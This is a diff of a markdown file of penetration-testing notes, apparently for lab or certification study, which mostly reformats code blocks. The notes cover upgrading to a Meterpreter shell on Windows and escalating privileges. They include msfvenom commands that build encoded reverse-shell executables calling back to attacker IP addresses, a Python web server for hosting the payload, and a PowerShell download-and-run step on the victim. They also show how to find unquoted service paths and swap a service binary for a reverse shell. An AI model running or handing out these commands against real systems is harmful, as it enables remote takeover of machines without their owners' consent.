@@ -57,30 +57,32 @@ Lists the processes that are being launched in real time, including processes ow
 
  ```
 ### Upgrade meterpreter shell Windows
-```
 1. Create a windows TCP reverse shell payload executable
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.49 LPORT=4446 -e x86/shikata_ga_nai -f exe -o reverse.exe
+```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.49 LPORT=4446 -e x86/shikata_ga_nai -f exe -o reverse.exe```
 OR
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.5 LPORT=4444 -f exe > reverse.exe
+```msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.5 LPORT=4444 -f exe > reverse.exe```
 
 2. Host the payload on a server from our kali machine (in order to download it from the vul-
 nerable machine)
 
-python -m http.server 8000 
+```python -m http.server 8000 ```
 
-3. Download the payload to the vulnerable machine using our powershell reverse shell use format Invoke-WebRequest -Uri "http://192.168.56.49:8000/reverse.exe" -Outfile "reverse.exe"
-Invoke-WebRequest http://10.8.0.5:8000/reverse.exe -outfile .\reverse.exe
+3. Download the payload to the vulnerable machine using our powershell reverse shell use
+format Invoke-WebRequest -Uri "http://192.168.56.49:8000/reverse.exe" -Outfile "reverse.exe"
+
+```Invoke-WebRequest http://10.8.0.5:8000/reverse.exe -outfile .\reverse.exe```
+
 -NOTE! may have to do this in public directory as its executable
 
-4. Create another netcat listener on our kali machine
-5. Execute the new reverse shell payload and capture the shell
+5. Create another netcat listener on our kali machine
+6. Execute the new reverse shell payload and capture the shell
 ./reverse.exe
-```
+
 ### Reveal vulnerable services on Windows System
-https://medium.com/@dasagreeva/windows-priv-
-ilege-escalation-methods-2e93c954a287
+https://medium.com/@dasagreeva/windows-privilege-escalation-methods-2e93c954a287
 1. Unquoted Service Paths
-```wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """```
+``` wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ ```
+
 Look for listed unquoted executable paths 
 Vulnerable Service Vulnerable Service C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe Auto
 If we drop malicious code to one of these paths, windows will run our exe as system upon restart of service
@@ -102,7 +104,6 @@ To restart and stop services USE
    Check permissions for vulnerable service executable path
 ```icacls “C:\Program Files (x86)\Program Folder\A Subfolder”```
 Replace executable.exe with a reverse shell payload and restarting the service
-```
 
 
  
